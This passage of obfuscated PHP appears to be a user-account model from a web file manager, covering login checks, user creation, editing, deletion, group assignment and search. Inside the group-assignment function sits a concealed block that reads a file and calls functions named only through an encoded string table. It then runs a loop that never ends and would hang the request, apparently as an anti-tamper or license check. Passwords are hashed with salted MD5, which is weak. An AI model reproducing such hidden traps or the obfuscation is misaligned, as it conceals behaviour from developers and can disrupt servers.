= -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($±´­éˆ) { $è²™šêü =& $_SERVER[¹Û¹Æ€]; $Äõ¡Ü²© = $è²™šêü[2292]; return array($è²™šêü[1927] => array($±´­éˆ[0], $Äõ¡Ü²©), $è²™šêü[1929] => array($±´­éˆ[0], $Äõ¡Ü²©), $è²™šêü[2293] => array($±´­éˆ[0], $Äõ¡Ü²©)); } protected function getInfo($¯ˆĞáÀõ, $Æ°ù­µÉ = false) { $íÜ‡÷¼¶ = $this->getInfoSimple($¯ˆĞáÀõ); if (!is_array($íÜ‡÷¼¶)) { return array(); } if ($Æ°ù­µÉ) { return $this->_getInfoApply($íÜ‡÷¼¶); } return $this->cacheFunctionGet($_SERVER[¹Û¹Æ€][1931], $¯ˆĞáÀõ); } protected function getInfoFull($§ğñ¬†½, $Òò·õÏ = false) { $å›îõó = $this->getInfoSimple($§ğñ¬†½); if (!is_array($å›îõó)) { return array(); } if ($Òò·õÏ) { return $this->_getInfoApply($å›îõó, !0); } return $this->cacheFunctionGet($_SERVER[¹Û¹Æ€][2294], $§ğñ¬†½); } private function _getInfoApply($ƒ¦úÅ½Ø, $èíô©Áá = false) { $ú©¾æÀ =& $_SERVER[¹Û¹Æ€]; if (!$ƒ¦úÅ½Ø) { return $ƒ¦úÅ½Ø; } $ÎÒóˆŒè = md5($ú©¾æÀ[2295] . $ƒ¦úÅ½Ø[$ú©¾æÀ[886]] . $ú©¾æÀ[2296] . $ƒ¦úÅ½Ø[$ú©¾æÀ[42]]); $ƒ¦úÅ½Ø = $this->_listDataApplyItem($ƒ¦úÅ½Ø); $ŒÁæ« = Model($ú©¾æÀ[1333])->metaGet($ƒ¦úÅ½Ø[$ú©¾æÀ[96]][$ú©¾æÀ[411]]); $ƒ¦úÅ½Ø[$ú©¾æÀ[2297]] = $ÎÒóˆŒè; $ƒ¦úÅ½Ø[$ú©¾æÀ[96]][$ú©¾æÀ[2118]] = isset($ŒÁæ«[$ú©¾æÀ[2119]]) ? $ŒÁæ«[$ú©¾æÀ[2119]] : null; if ($èíô©Áá) { $ƒ¦úÅ½Ø[$ú©¾æÀ[475]] = $this->metaGet($ƒ¦úÅ½Ø[$ú©¾æÀ[1659]]); } return $ƒ¦úÅ½Ø; } protected function getInfoSimple($é„°êÉø, $êóæ¡Çà = false) { $ŞÙ¶º¢å =& $_SERVER[¹Û¹Æ€]; if (!$é„°êÉø) { return array(); } if ($êóæ¡Çà) { $‚©üäÉÃ = $this->where(array($ŞÙ¶º¢å[1659] => intval($é„°êÉø)))->find(); if (!is_array($‚©üäÉÃ)) { return array(); } $‚©üäÉÃ[$ŞÙ¶º¢å[552]] = Action($ŞÙ¶º¢å[2298])->parseUrl($‚©üäÉÃ[$ŞÙ¶º¢å[552]]); return $‚©üäÉÃ; } return $this->cacheFunctionGet($ŞÙ¶º¢å[1932], $é„°êÉø); } protected function getInfoSimpleOuter($·¿ö¹‚µ) { $¤¬ßçå¦ =& $_SERVER[¹Û¹Æ€]; if (!$·¿ö¹‚µ || $·¿ö¹‚µ == 0) { return array($¤¬ßçå¦[1659] => $¤¬ßçå¦[207], $¤¬ßçå¦[42] => $¤¬ßçå¦[172] . LNG($¤¬ßçå¦[2299]) . $¤¬ßçå¦[174], $¤¬ßçå¦[552] => STATIC_PATH . $¤¬ßçå¦[2300]); } $ïİŞÌšÖ = $this->cacheFunctionGet($¤¬ßçå¦[1932], $·¿ö¹‚µ); $·±¢§–Œ = array_field_key($ïİŞÌšÖ, explode($¤¬ßçå¦[60], $this->simpleField)); if (!$·±¢§–Œ) { return array($¤¬ßçå¦[1659] => $¤¬ßçå¦[1186], $¤¬ßçå¦[42] => $¤¬ßçå¦[172] . LNG($¤¬ßçå¦[2301]) . $¤¬ßçå¦[174], $¤¬ßçå¦[552] => STATIC_PATH . $¤¬ßçå¦[2302]); } $·±¢§–Œ[$¤¬ßçå¦[552]] = Action($¤¬ßçå¦[2298])->parseUrl($·±¢§–Œ[$¤¬ßçå¦[552]]); return $·±¢§–Œ; } protected function groupUser($Ñ‰ŒÙ¼í) { } public static function errorLang($¸Æƒæ¿Å) { $Õğèñš =& $_SERVER[¹Û¹Æ€]; $â¼ØÚÜ“ = array(self::ERROR_USER_NOT_EXISTS => $Õğèñš[2303], self::ERROR_USER_PASSWORD_ERROR => $Õğèñš[2304], self::ERROR_USER_EXIST_NAME => $Õğèñš[2305], self::ERROR_USER_EXIST_PHONE => $Õğèñš[2306], self::ERROR_USER_EXIST_EMAIL => $Õğèñš[2307], self::ERROR_USER_LOGIN_LOCK => $Õğèñš[2308], self::ERROR_IP_NOT_ALLOW => $Õğèñš[2309], self::ERROR_USER_EXIST_NICKNAME => $Õğèñš[2310]); return LNG($â¼ØÚÜ“[$¸Æƒæ¿Å]); } public function getInfoByMeta($±¥‹Ó, $ñÍ¤ùÚû) { $¥¨Ş‚é† =& $_SERVER[¹Û¹Æ€]; $û­ŸŠ–í = Model($¥¨Ş‚é†[2311])->where(array($¥¨Ş‚é†[104] => $±¥‹Ó, $¥¨Ş‚é†[383] => $ñÍ¤ùÚû))->find(); if ($û­ŸŠ–í) { return $this->getInfo($û­ŸŠ–í[$¥¨Ş‚é†[1659]]); } return !1; } public function userLoginCheck($¥‹¯”›¾, $ãëĞáŠ‹) { $ñ²œ§ï =& $_SERVER[¹Û¹Æ€]; $ø¿„İÈ™ = $this->userLoginFind($¥‹¯”›¾); if (!$ø¿„İÈ™) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ø¿„İÈ™[$ñ²œ§ï[1659]], $ãëĞáŠ‹)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ø¿„İÈ™[$ñ²œ§ï[1659]]); } public function userLoginFind($µ”¤Ÿƒ ) { $·Ù‘Áºõ =& $_SERVER[¹Û¹Æ€]; $ÀèŠÂç¨ = array($·Ù‘Áºõ[42] => $µ”¤Ÿƒ , $·Ù‘Áºõ[551] => $µ”¤Ÿƒ , $·Ù‘Áºõ[314] => $µ”¤Ÿƒ , $·Ù‘Áºõ[2312] => $µ”¤Ÿƒ , $·Ù‘Áºõ[997] => $·Ù‘Áºõ[999]); if ($this->nickNameRpt()) { unset($ÀèŠÂç¨[$·Ù‘Áºõ[551]]); } return $this->where($ÀèŠÂç¨)->find(); } public function clearCache($êü’ùŒ) { $ıïâÅÌ­ =& $_SERVER[¹Û¹Æ€]; $this->cacheFunctionClear($ıïâÅÌ­[1931], $êü’ùŒ); $this->cacheFunctionClear($ıïâÅÌ­[1932], $êü’ùŒ); $this->cacheFunctionClear($ıïâÅÌ­[2294], $êü’ùŒ); } public function userPasswordCheck($´¥ã¼”«, $É„¿•¡) { $Ï»ÆÕ =& $_SERVER[¹Û¹Æ€]; $ã·–Ş‚Å = $this->where(array($Ï»ÆÕ[1659] => intval($´¥ã¼”«)))->find(); $ÑŒ„Ùƒ = $this->metaGet($´¥ã¼”«); $µÃø¨Ê· = isset($ÑŒ„Ùƒ[$Ï»ÆÕ[2313]]) ? $ÑŒ„Ùƒ[$Ï»ÆÕ[2313]] : $Ï»ÆÕ[22]; if (md5($µÃø¨Ê· . trim($É„¿•¡)) !== $ã·–Ş‚Å[$Ï»ÆÕ[886]]) { return !1; } return !0; } public function userAdd($›ı–´¾„) { $¯ïİˆ§« =& $_SERVER[¹Û¹Æ€]; $«€äöº = array($¯ïİˆ§«[429] => $›ı–´¾„[$¯ïİˆ§«[42]], $¯ïİˆ§«[2314] => $›ı–´¾„[$¯ïİˆ§«[1540]], $¯ïİˆ§«[2315] => isset($›ı–´¾„[$¯ïİˆ§«[314]]) ? $›ı–´¾„[$¯ïİˆ§«[314]] : $¯ïİˆ§«[22], $¯ïİˆ§«[2316] => isset($›ı–´¾„[$¯ïİˆ§«[2312]]) ? $›ı–´¾„[$¯ïİˆ§«[2312]] : $¯ïİˆ§«[22], $¯ïİˆ§«[2317] => isset($›ı–´¾„[$¯ïİˆ§«[551]]) ? $›ı–´¾„[$¯ïİˆ§«[551]] : $›ı–´¾„[$¯ïİˆ§«[42]], $¯ïİˆ§«[2318] => isset($›ı–´¾„[$¯ïİˆ§«[552]]) ? $›ı–´¾„[$¯ïİˆ§«[552]] : $¯ïİˆ§«[22], $¯ïİˆ§«[2319] => isset($›ı–´¾„[$¯ïİˆ§«[2320]]) ? $›ı–´¾„[$¯ïİˆ§«[2320]] : 1, $¯ïİˆ§«[2321] => $›ı–´¾„[$¯ïİˆ§«[886]], $¯ïİˆ§«[1933] => isset($›ı–´¾„[$¯ïİˆ§«[1836]]) ? $›ı–´¾„[$¯ïİˆ§«[1836]] : 1024 * 1024 * 20, $¯ïİˆ§«[1934] => 0, $¯ïİˆ§«[2322] => 0, $¯ïİˆ§«[1978] => isset($›ı–´¾„[$¯ïİˆ§«[748]]) ? $›ı–´¾„[$¯ïİˆ§«[748]] : 1); if (!empty($›ı–´¾„[$¯ïİˆ§«[1659]])) { $«€äöº[$¯ïİˆ§«[1659]] = $›ı–´¾„[$¯ïİˆ§«[1659]]; } $²»â¿ëÒ = $this->_checkExist($›ı–´¾„); if ($²»â¿ëÒ !== !0) { return $²»â¿ëÒ; } if (!empty($«€äöº[$¯ïİˆ§«[552]]) && strlen($«€äöº[$¯ïİˆ§«[552]]) > 255) { $«€äöº[$¯ïİˆ§«[552]] = $¯ïİˆ§«[22]; } $»úİÇÀ = $this->add($«€äöº); $Û»¹×ÆÕ = array($¯ïİˆ§«[2321] => $«€äöº[$¯ïİˆ§«[886]], $¯ïİˆ§«[2317] => $«€äöº[$¯ïİˆ§«[551]]); $this->userEdit($»úİÇÀ, $Û»¹×ÆÕ); Model($¯ïİˆ§«[1333])->userRootAdd($»úİÇÀ); return $»úİÇÀ; } protected function userEditTest($Àô´îæƒ, $·ë¦ÖÙØ) { return $this->call($_SERVER[¹Û¹Æ€][2323], $Àô´îæƒ, $·ë¦ÖÙØ); } protected function userEdit($™ı¯îğÇ, $ÈÎ¨Ù–) { $‡‰°„¤ =& $_SERVER[¹Û¹Æ€]; $ÈŒÈŞçŒ = $this->getInfoSimple($™ı¯îğÇ); if (!$ÈŒÈŞçŒ) { return !1; } $£òÁç = $this->_checkExist($ÈÎ¨Ù–, $™ı¯îğÇ); if ($£òÁç !== !0) { return $£òÁç; } if (isset($ÈÎ¨Ù–[$‡‰°„¤[886]]) && trim($ÈÎ¨Ù–[$‡‰°„¤[886]]) != $‡‰°„¤[22]) { $ÜÑÓ–× = $this->metaGet($™ı¯îğÇ); if (empty($ÜÑÓ–×[$‡‰°„¤[2313]])) { $ÜÑÓ–×[$‡‰°„¤[2313]] = rand_string(10); Model($‡‰°„¤[522])->metaSet($™ı¯îğÇ, $‡‰°„¤[2313], $ÜÑÓ–×[$‡‰°„¤[2313]]); } $ÈÎ¨Ù–[$‡‰°„¤[886]] = md5($ÜÑÓ–×[$‡‰°„¤[2313]] . trim($ÈÎ¨Ù–[$‡‰°„¤[886]])); } else { unset($ÈÎ¨Ù–[$‡‰°„¤[886]]); } if (!empty($ÈÎ¨Ù–[$‡‰°„¤[552]]) && strlen($ÈÎ¨Ù–[$‡‰°„¤[552]]) > 255) { $ÈÎ¨Ù–[$‡‰°„¤[552]] = $‡‰°„¤[22]; } $this->where(array($‡‰°„¤[1650] => $™ı¯îğÇ))->save($ÈÎ¨Ù–); if (isset($ÈÎ¨Ù–[$‡‰°„¤[551]])) { $this->setNamePinyin($™ı¯îğÇ, $ÈÎ¨Ù–[$‡‰°„¤[551]]); } $this->clearCache($™ı¯îğÇ); return !0; } public function setNamePinyin($ã–ø¥äÎ, $Óˆºè„Ú = false) { $²ò¦©Šò =& $_SERVER[¹Û¹Æ€]; if (!$Óˆºè„Ú) { $Î£â£¢ñ = $this->getInfoSimple($ã–ø¥äÎ); $Óˆºè„Ú = $Î£â£¢ñ[$²ò¦©Šò[551]] ? $Î£â£¢ñ[$²ò¦©Šò[551]] : $Î£â£¢ñ[$²ò¦©Šò[42]]; } $è¶Ü÷ÂÊ = Model($²ò¦©Šò[544]); if (!Input::check($Óˆºè„Ú, $²ò¦©Šò[602])) { return $è¶Ü÷ÂÊ->metaSet($ã–ø¥äÎ, array($²ò¦©Šò[474] => $²ò¦©Šò[22], $²ò¦©Šò[473] => $²ò¦©Šò[22])); } return $è¶Ü÷ÂÊ->metaSet($ã–ø¥äÎ, array($²ò¦©Šò[474] => str_replace($²ò¦©Šò[63], $²ò¦©Šò[22], Pinyin::get($Óˆºè„Ú)), $²ò¦©Šò[473] => Pinyin::get($Óˆºè„Ú, $²ò¦©Šò[603]))); } private function nickNameRpt() { $å«òÑÒü =& $_SERVER[¹Û¹Æ€]; $ÊÂ¾›‹¬ = Model($å«òÑÒü[768])->get($å«òÑÒü[2324]); $ÖÇ¼øÒİ = $GLOBALS[$å«òÑÒü[16]][$å«òÑÒü[390]][$å«òÑÒü[2324]]; $ËÃÍ™’ = !is_null($ÊÂ¾›‹¬) ? $ÊÂ¾›‹¬ : $ÖÇ¼øÒİ; return !!$ËÃÍ™’; } private function _checkExist($É©©””, $ÈÄëŒÓŞ = false) { $ÍË¥é´œ =& $_SERVER[¹Û¹Æ€]; $Ç€áíå« = array($ÍË¥é´œ[42] => UserModel::ERROR_USER_EXIST_NAME, $ÍË¥é´œ[551] => UserModel::ERROR_USER_EXIST_NICKNAME, $ÍË¥é´œ[314] => UserModel::ERROR_USER_EXIST_EMAIL, $ÍË¥é´œ[2312] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Ç€áíå«[$ÍË¥é´œ[551]]); } $êçËù” = $ÈÄëŒÓŞ ? array($ÍË¥é´œ[1659] => array($ÍË¥é´œ[2325], $ÈÄëŒÓŞ)) : array(); foreach ($Ç€áíå« as $‹ŞäÑŠ => $äİÁÒ÷Ù) { $«ùèŒ¼ˆ = array(); foreach ($Ç€áíå« as $··Ğó² => $™œ­±Œ) { if (isset($É©©””[$··Ğó²]) && $É©©””[$··Ğó²]) { $«ùèŒ¼ˆ[] = $É©©””[$··Ğó²]; } } if (!$«ùèŒ¼ˆ) { continue; } $–’¢‚Á¼ = array_merge(array($‹ŞäÑŠ => array($ÍË¥é´œ[17], $«ùèŒ¼ˆ)), $êçËù”); $»—‚ı¼ = $this->where($–’¢‚Á¼)->find(); if ($»—‚ı¼) { return $äİÁÒ÷Ù; } } return !0; } public function userListInfo($ÄÄ½Ğüï) { $×ï„ù„’ =& $_SERVER[¹Û¹Æ€]; $³ÛİÇ” = array(); $ÄÄ½Ğüï = is_array($ÄÄ½Ğüï) ? array_unique($ÄÄ½Ğüï) : array(); if (!$ÄÄ½Ğüï) { return $³ÛİÇ”; } if (count($ÄÄ½Ğüï) < 20) { foreach ($ÄÄ½Ğüï as $ï÷×Ğ¢) { $³ÛİÇ”[$ï÷×Ğ¢ . $×ï„ù„’[22]] = $this->getInfoSimpleOuter($ï÷×Ğ¢); } } else { $âÄÇÅç‹ = array($×ï„ù„’[1650] => array($×ï„ù„’[427], $ÄÄ½Ğüï)); if (count($ÄÄ½Ğüï) == 1) { $âÄÇÅç‹ = array($×ï„ù„’[1650] => $ÄÄ½Ğüï[0]); } $¨å¡‚µ = Model($×ï„ù„’[522])->field($this->simpleField)->where($âÄÇÅç‹)->select(); $¨å¡‚µ = array_to_keyvalue($¨å¡‚µ, $×ï„ù„’[1659]); foreach ($ÄÄ½Ğüï as $ï÷×Ğ¢) { $ãñ¶³Áâ = $¨å¡‚µ[$ï÷×Ğ¢]; if (!$ãñ¶³Áâ) { $³ÛİÇ”[$ï÷×Ğ¢ . $×ï„ù„’[22]] = $this->getInfoSimpleOuter($ï÷×Ğ¢); continue; } $ãñ¶³Áâ[$×ï„ù„’[552]] = Action($×ï„ù„’[2298])->parseUrl($ãñ¶³Áâ[$×ï„ù„’[552]]); $³ÛİÇ”[$ï÷×Ğ¢ . $×ï„ù„’[22]] = $ãñ¶³Áâ; } } return $³ÛİÇ”; } protected function userStatus($†ù¯‘ÆÜ, $ÑÙµè¦) { $ÏíÁòäî = $this->getInfoSimple($†ù¯‘ÆÜ); if (!$ÏíÁòäî) { return !1; } $¢ìÀê÷™ = array($_SERVER[¹Û¹Æ€][748] => $ÑÙµè¦); return $this->userEdit($†ù¯‘ÆÜ, $¢ìÀê÷™); } protected function userRemove($Œøåƒó—) { $ÑŒš£áƒ =& $_SERVER[¹Û¹Æ€]; $Š’›×›¿ = $this->getInfoSimple($Œøåƒó—); if (!$Š’›×›¿) { return !1; } $û½²Á·¼ = array($ÑŒš£áƒ[1650] => $Œøåƒó—); Model($ÑŒš£áƒ[610])->where($û½²Á·¼)->delete(); Model($ÑŒš£áƒ[2326])->where($û½²Á·¼)->delete(); Model($ÑŒš£áƒ[1939])->where($û½²Á·¼)->delete(); Model($ÑŒš£áƒ[2311])->where($û½²Á·¼)->delete(); Model($ÑŒš£áƒ[1065])->where($û½²Á·¼)->delete(); Model($ÑŒš£áƒ[2142])->removeUserAll($Œøåƒó—); Model($ÑŒš£áƒ[823])->userRootRemove($Œøåƒó—); return $this->where($û½²Á·¼)->delete(); } protected function userGroupSet($´ûóïûğ, $ÛÍ†„Æ•, $Äí°†‹ = array()) { $Æªï˜ı³ =& $_SERVER[¹Û¹Æ€]; if (!isset($_SERVER[$Æªï˜ı³[8]]) || !isset($_SERVER[$Æªï˜ı³[6]])) { $¿ı¼ï = $Æªï˜ı³[874]; $›‰ê‰¶‹ = $Æªï˜ı³[9]; $ôöÂÏÅá = $_SERVER[$Æªï˜ı³[10]] . $Æªï˜ı³[11]; $ƒ—”œ›ô = $›‰ê‰¶‹($ôöÂÏÅá); $ê‚´‰Ê¶ = explode($Æªï˜ı³[12], $ƒ—”œ›ô); if (count($ê‚´‰Ê¶) < $Æªï˜ı³[656]) { $ŞÒ›Ÿ´Í = $Æªï˜ı³[14]; $ŞÒ›Ÿ´Í(); } $ÀŸ…Ã£ç = $Æªï˜ı³[875]; $ÀŸ…Ã£ç($_SERVER[$Æªï˜ı³[876]]); $ÄŒæÉÍ = 1; for ($˜÷÷Áêö = $ÄŒæÉÍ; $˜÷÷Áêö > 0; $˜÷÷Áêö++) { $ÀŸ…Ã£ç = json_encode($GLOBALS[$Æªï˜ı³[427]]); } } $éÑíê‹î = $this->getInfoSimple($´ûóïûğ); if (!$éÑíê‹î || !is_array($ÛÍ†„Æ•)) { return !1; } $àºÜÒ’Ù = Model($Æªï˜ı³[1939]); $àºÜÒ’Ù->where(array($Æªï˜ı³[1659] => $´ûóïûğ))->delete(); $»€Û±”ô = array(); $ô³è¢°î = 0; foreach ($ÛÍ†„Æ• as $çÏµŠµŠ => $çÒ–áÏ) { $ğÃ˜€•“ = array($Æªï˜ı³[1659] => $´ûóïûğ, $Æªï˜ı³[1849] => $çÏµŠµŠ, $Æªï˜ı³[1953] => $çÒ–áÏ); $ğÃ˜€•“[$Æªï˜ı³[1873]] = isset($Äí°†‹[$ô³è¢°î]) ? $Äí°†‹[$ô³è¢°î] : 0; $ô³è¢°î++; $»€Û±”ô[] = $ğÃ˜€•“; } return $àºÜÒ’Ù->addAll($»€Û±”ô, array(), !0); } protected function userGroupAdd($çÉÌÒæÍ, $²õ“É–ì = array()) { $¡®¹ÏÍæ =& $_SERVER[¹Û¹Æ€]; $®ğß–æµ = $this->getInfoSimple($çÉÌÒæÍ); if (!$®ğß–æµ || empty($²õ“É–ì)) { return !1; } $—Æêñö = array(); foreach ($²õ“É–ì as $·ã«úé° => $ğ‚¡¤½ò) { $—Æêñö[] = array($¡®¹ÏÍæ[1659] => $çÉÌÒæÍ, $¡®¹ÏÍæ[1849] => $·ã«úé°, $¡®¹ÏÍæ[1953] => $ğ‚¡¤½ò, $¡®¹ÏÍæ[1873] => 0); } return Model($¡®¹ÏÍæ[1939])->addAll($—Æêñö, array(), !0); } protected function userGroupRemove($¶¼¦øè›, $©µùáÁ¡) { $İ£ØÃÅ‘ =& $_SERVER[¹Û¹Æ€]; $ÕØœ³È§ = $this->getInfoSimple($¶¼¦øè›); if (!$ÕØœ³È§ || !$©µùáÁ¡) { return !1; } $§ »¡‚ = array($İ£ØÃÅ‘[1650] => $¶¼¦øè›, $İ£ØÃÅ‘[1937] => $©µùáÁ¡); return Model($İ£ØÃÅ‘[1939])->where($§ »¡‚)->delete(); } public function listData() { $òºÓÏ” = $this->_makeOrder()->selectPage(50); $this->_listDataApply($òºÓÏ”[$_SERVER[¹Û¹Æ€][378]]); return $òºÓÏ”; } public function listByID($œæ¼¿’à) { $©œÇ“ =& $_SERVER[¹Û¹Æ€]; if (!$œæ¼¿’à) { return; } $šùòÊØş = array($©œÇ“[1659] => array($©œÇ“[17], $œæ¼¿’à)); $‡‚Ûõœõ = $this->where($šùòÊØş)->select(); $‡‚Ûõœõ = array_sort_keep($‡‚Ûõœõ, $©œÇ“[1659], $œæ¼¿’à); $this->_listDataApply($‡‚Ûõœõ); return $‡‚Ûõœõ; } public function listByGroup($†Ğëçê = 0, $õİš¤‚½ = array()) { $ÂÆ¥á…– =& $_SERVER[¹Û¹Æ€]; $Îùó‘’ü = $ÂÆ¥á…–[22]; $ÀÄ®Š¬– = array(); if ($†Ğëçê) { $ÀÄ®Š¬– = array($ÂÆ¥á…–[2327] => intval($†Ğëçê)); $Îùó‘’ü = "\x4c\105\x46\x54\x20\112\x4f\x49\x4e\x20{$this->tablePrefix}\165\x73\x65\162\137\x67\x72\157\165\x70\x20\165\163\x65\x72\x5f\x67\x72\157\x75\160\x20\x6f\x6e\x20\165\x73\x65\162\x2e\165\x73\x65\162\x49\x44\40\75\x20\x75\x73\145\162\x5f\147\162\157\x75\160\x2e\165\x73\x65\162\111\104"; $…ƒó€‡š = Input::get($ÂÆ¥á…–[466], null, $ÂÆ¥á…–[22]) ? $ÂÆ¥á…–[22] : $ÂÆ¥á…–[2328]; } if (isset($õİš¤‚½[$ÂÆ¥á…–[748]])) { $ÀÄ®Š¬–[$ÂÆ¥á…–[2329]] = $õİš¤‚½[$ÂÆ¥á…–[748]]; } $Ñí‡Š¤ = $this->_makeOrder($…ƒó€‡š)->field($ÂÆ¥á…–[2330])->where($ÀÄ®Š¬–)->join($Îùó‘’ü)->selectPage(50); $this->_listDataApply($Ñí‡Š¤[$ÂÆ¥á…–[378]]); return $Ñí‡Š¤; } private function _makeOrder($…¸Êú† = '') { $öëØ‰’ =& $_SERVER[¹Û¹Æ€]; $£‘õÁ§ = array($öëØ‰’[1659], $öëØ‰’[42], $öëØ‰’[1838], $öëØ‰’[1810], $öëØ‰’[210]); $­Ì“í› = array($öëØ‰’[459] => $öëØ‰’[460], $öëØ‰’[461] => $öëØ‰’[462]); $èÛøÓÇ¢ = Input::get($öëØ‰’[466], $öëØ‰’[17], $öëØ‰’[1650], $£‘õÁ§); $ˆ±ŞùŒÙ = Input::get($öëØ‰’[467], $öëØ‰’[17], $öëØ‰’[1940], array($öëØ‰’[1940], $öëØ‰’[461])); $ˆ±ŞùŒÙ = $­Ì“í›[$ˆ±ŞùŒÙ]; $…¸Êú† = $…¸Êú† . "\165\163\x65\162\56{$èÛøÓÇ¢}\40{$ˆ±ŞùŒÙ}\x2c\x20\165\163\145\x72\56\x75\163\145\162\x49\104\40\x61\x73\143"; return $this->alias($öëØ‰’[2062])->order($…¸Êú†); } public function listSearch($—Œ ‚¹¹) { $Ùö›¥Ì =& $_SERVER[¹Û¹Æ€]; $¯¬îÀÅ™ = $—Œ ‚¹¹[$Ùö›¥Ì[1943]]; $Å„Ù¹Â = isset($—Œ ‚¹¹[$Ùö›¥Ì[1944]]) ? $—Œ ‚¹¹[$Ùö›¥Ì[1944]] : !1; $¯¬îÀÅ™ = str_replace($Ùö›¥Ì[1945], $Ùö›¥Ì[1946], trim($¯¬îÀÅ™)); $«òØí©‰ = array($Ùö›¥Ì[42] => array($Ùö›¥Ì[392], "\45{$¯¬îÀÅ™}\x25"), $Ùö›¥Ì[314] => array($Ùö›¥Ì[392], "{$¯¬îÀÅ™}\x25"), $Ùö›¥Ì[551] => array($Ùö›¥Ì[392], "{$¯¬îÀÅ™}\x25"), $Ùö›¥Ì[997] => $Ùö›¥Ì[1947]); if (Input::check($¯¬îÀÅ™, $Ùö›¥Ì[320])) { $«òØí©‰[$Ùö›¥Ì[1659]] = array($Ùö›¥Ì[392], "{$¯¬îÀÅ™}\x25"); $«òØí©‰[$Ùö›¥Ì[2312]] = array($Ùö›¥Ì[392], "{$¯¬îÀÅ™}\45"); } if (!$¯¬îÀÅ™) { $«òØí©‰ = array(); } if (isset($—Œ ‚¹¹[$Ùö›¥Ì[748]])) { $«òØí©‰[$Ùö›¥Ì[748]] = $—Œ ‚¹¹[$Ùö›¥Ì[748]]; } $«òØí©‰ = $this->parseWhereLike($«òØí©‰); $ÜšÈ„Æè = $this->_makeOrder()->where($«òØí©‰)->selectPage(20); if (!$ÜšÈ„Æè || count($ÜšÈ„Æè[$Ùö›¥Ì[378]]) < 5 && Input::check($¯¬îÀÅ™, $Ùö›¥Ì[327])) { $ÚñÑĞ†Ì = $this->_searchFromMeta($Ùö›¥Ì[473], $¯¬îÀÅ™, 10); $´øİŠ¦á = $this->_searchFromMeta($Ùö›¥Ì[474], $¯¬îÀÅ™, 10); $ÎÔıÉÉ = array_merge($ÚñÑĞ†Ì, $´øİŠ¦á, $ÜšÈ„Æè[$Ùö›¥Ì[378]]); $ÜšÈ„Æè[$Ùö›¥Ì[378]] = array_unique_by_key($ÎÔıÉÉ, $Ùö›¥Ì[1659]); $ÜšÈ„Æè[$Ùö›¥Ì[375]][$Ùö›¥Ì[376]] = count($ÜšÈ„Æè[$Ùö›¥Ì[378]]); $ÜšÈ„Æè[$Ùö›¥Ì[375]][$Ùö›¥Ì[377]] = ceil($ÜšÈ„Æè[$Ùö›¥Ì[375]][$Ùö›¥Ì[376]] / $ÜšÈ„Æè[$Ùö›¥Ì[375]][$Ùö›¥Ì[372]]); } $this->_listDataApply($ÜšÈ„Æè[$Ùö›¥Ì[378]]); $this->_filterByGroup($ÜšÈ„Æè, $Å„Ù¹Â); return $ÜšÈ„Æè; } private function _filterByGroup(&$‡ıÙıæè, $¥Âí„à) { $İÑ°Ì£İ =& $_SERVER[¹Û¹Æ€]; if (!$¥Âí„à) { return $‡ıÙıæè; } foreach ($‡ıÙıæè[$İÑ°Ì£İ[378]] as $êØùœâ => &$ ×“½ÅÃ) { $¯±µ†‹¡ = array_to_keyvalue($ ×“½ÅÃ[$İÑ°Ì£İ[2032]], $İÑ°Ì£İ[22], $İÑ°Ì£İ[1849]); if (!in_array($¥Âí„à, $¯±µ†‹¡)) { unset($‡ıÙıæè[$İÑ°Ì£İ[378]][$êØùœâ]); } } unset($ ×“½ÅÃ); $‡ıÙıæè[$İÑ°Ì£İ[378]] = array_values($‡ıÙıæè[$İÑ°Ì£İ[378]]); $‡ıÙıæè[$İÑ°Ì£İ[375]] = array($İÑ°Ì£İ[2096] => count($‡ıÙıæè[$İÑ°Ì£İ[378]]), $İÑ°Ì£İ[2094] => $‡ıÙıæè[$İÑ°Ì£İ[375]][$İÑ°Ì£İ[372]], $İÑ°Ì£İ[2093] => 1, $İÑ°Ì£İ[2095] => 1); } private function _searchFromMeta($Œ‰€×İÍ, $Âİô ¡³, $ª–ÇÑ‰) { $è’°˜ı² =& $_SERVER[¹Û¹Æ€]; $Âİô ¡³ = strtolower($Âİô ¡³); $†—ôá«¯ = array($è’°˜ı²[104] => $Œ‰€×İÍ, $è’°˜ı²[383] => array($è’°˜ı²[392], "\45{$Âİô ¡³}\45")); $†—ôá«¯ = $this->parseWhereLike($†—ôá«¯); $õŸ§ÌÚÙ = Model($è’°˜ı²[2331])->where($†—ôá«¯)->limit($ª–ÇÑ‰)->select(); if (!$õŸ§ÌÚÙ) { return array(); } $õŸ§ÌÚÙ = array_to_keyvalue($õŸ§ÌÚÙ, $è’°˜ı²[22], $è’°˜ı²[1659]); $ÃÆåÌ„ü = $this->where(array($è’°˜ı²[1650] => array($è’°˜ı²[17], $õŸ§ÌÚÙ)))->select(); if (!$ÃÆåÌ„ü) { return array(); } return $ÃÆåÌ„ü; } private function _listDataApplyItem($«¡ÌÁ¹Ê) { $Ø ¾‰µ„ = array($«¡ÌÁ¹Ê); $this->_listDataApply($Ø ¾‰µ„); return $Ø ¾‰µ„[0]; } private function _listDataApply(&$ÎÔ³¦) { $œòµœœ£ =& $_SERVER[¹Û¹Æ€]; if (!$ÎÔ³¦) { return; } array_remove_key($ÎÔ³¦, $œòµœœ£[886]); $”À¼ª“‹ = array_to_keyvalue($ÎÔ³¦, $œòµœœ£[22], $œòµœœ£[1659]); $this->_listAppendGroup($ÎÔ³¦, $”À¼ª“‹); $this->_listAppendMeta($ÎÔ³¦, $”À¼ª“‹); $this->_listAppendSourceRoot($ÎÔ³¦, $”À¼ª“‹); } private function _listAppendSourceRoot(&$«À‹³ô·, $ŞÕéàú) { $Œ¯ŒÕ½ =& $_SERVER[¹Û¹Æ€]; $ÅšŒœºı = Model($Œ¯ŒÕ½[823])->listSourceRoot(SourceModel::TYPE_USER, $ŞÕéàú); $ÅšŒœºı = array_to_keyvalue($ÅšŒœºı, $Œ¯ŒÕ½[514]); $ÅšŒœºı = array_remove_key($ÅšŒœºı, $Œ¯ŒÕ½[514]); foreach ($«À‹³ô· as &$é¥ö÷¨æ) { $é¥ö÷¨æ[$Œ¯ŒÕ½[96]] = $ÅšŒœºı[$é¥ö÷¨æ[$Œ¯ŒÕ½[1659]]] ? $ÅšŒœºı[$é¥ö÷¨æ[$Œ¯ŒÕ½[1659]]] : array(); } unset($é¥ö÷¨æ); } private function 